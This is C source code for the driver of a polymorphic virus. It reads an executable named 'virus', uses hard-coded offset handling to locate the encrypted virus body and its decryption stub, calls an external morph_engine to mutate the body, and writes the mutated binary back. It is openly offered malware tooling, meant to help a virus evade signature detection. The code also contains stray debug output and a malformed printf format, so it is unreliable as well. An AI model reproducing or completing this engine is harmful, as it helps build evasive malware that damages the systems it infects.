#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <bfd.h>

extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
// extern int decrypt_engine(char* exe_data,size_t full_addr_enc_begin ,size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);

int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
{



      // printf("%ul\n", virus_instruction_begin);
      // printf("%ul\n", virus_encrypt_size);
      // printf("%ul\n", virus_decrypt_offset);

	printf("hi");

	// seed the random number generator
	srand(time(NULL));

	// unsigned long full_addr_enc_begin = virus_instruction_begin;

	// to get offset just delete the most significant char
	char buffer1[15];
	sprintf(buffer1, "%06lx", (unsigned long)virus_instruction_begin);
	char *main_offset = buffer1;
	write(1, main_offset, strlen(main_offset));
	main_offset = main_offset + 1;
	write(1, main_offset, strlen(main_offset));
	printf("\n");

	char buffer3[15];
	sprintf(buffer3, "%06lx", (unsigned long)virus_decrypt_offset);
	char *decryption_offset = buffer3;
	decryption_offset = decryption_offset + 1;
	write(1, decryption_offset, strlen(decryption_offset));

	printf("\n");


    virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
	virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);

    //   printf("%ul\n", virus_instruction_begin);
    //   printf("%ul\n", virus_decrypt_offset);

	// printf("hi");
	// virus_instruction_begin = 1230;
	// virus_encrypt_size = 2784;
	// virus_decrypt_offset = 7635;

	printf("hi");

      printf("%ul\n", virus_instruction_begin);
      printf("%ul\n", virus_decrypt_offset);
	// virus name
	char filename[] = "virus";

	// open the executable file
	FILE* exe_file = fopen(filename, "rb");
	if(!exe_file)
	{
		printf("Failed to open %s\n", filename);
		return -1;
	}

	// get the size of the executable file
	size_t exe_size;
	fseek(exe_file, 0, SEEK_END);
	exe_size = ftell(exe_file);
	rewind(exe_file);

	// allocate the data
	char* exe_data = malloc(exe_size);
	if(!exe_data)
	{
		fclose(exe_file);
		printf("Executable data allocation failed\n");
		return 1;
	}

	// read the entire executable file
	if(!fread(exe_data, exe_size, 1, exe_file))
	{
		fclose(exe_file);
		printf("Executable file read failed\n");
		goto quit;
	}

	// close the file
	fclose(exe_file);

	// call the polymorphic engine
	if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	{
		printf("An error occured in the polymorphic engine\n");
		goto quit;
	}


	// open the output file
	FILE* out_file = fopen(filename, "wb");
	if(!out_file)
	{
		printf("failed to open %s\n", filename);
		goto quit;
	}

	// write the modified executable data
	if(!fwrite(exe_data, exe_size, 1, out_file))
	{
		printf("failed to write into %s\n", filename);
	}

quit:
	free(exe_data);
return 0;

}